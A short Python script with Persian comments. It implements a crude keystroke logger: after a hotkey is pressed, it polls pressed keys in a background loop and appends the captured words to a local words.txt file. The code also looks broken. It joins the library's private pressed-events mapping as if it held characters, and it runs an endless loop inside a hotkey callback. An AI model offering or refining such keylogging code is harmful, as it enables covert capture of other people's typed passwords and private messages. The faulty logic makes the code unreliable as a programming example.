import keyboard
import time

# تعریف تابعی برای ذخیره کردن کلمات در فایل


def save_words(words):
    with open('words.txt', 'a') as f:
        f.write(words + '\n')

# تعریف تابعی برای آپدیت لیست کلمات


def update_words():
    global words
    # گرفتن کلمه جاری با اتصال حروف به هم
    current_word = ''.join(keyboard._pressed_events)
    # اگر اسپیس وجود داشته باشد، کلمه جدید را به لیست کلمات اضافه کنید و فایل را ذخیره کنید.
    if ' ' in current_word:
        words.append(current_word.replace(' ', ''))
        save_words(current_word.replace(' ', ''))
    return

# تعریف تابعی برای مدیریت پردازش در پس زمینه


def background_process():
    while True:
        update_words()
        time.sleep(0.1)  # یک تاخیر کوچک برای کاهش بار سیستم


words = []  # لیستی برای ذخیره کلمات از کیبورد

# شروع پردازش در پس زمینه
keyboard.add_hotkey('ctrl+alt+k', lambda: keyboard.unhook_all())
keyboard.add_hotkey('ctrl+alt+j', background_process)
keyboard.wait('esc')
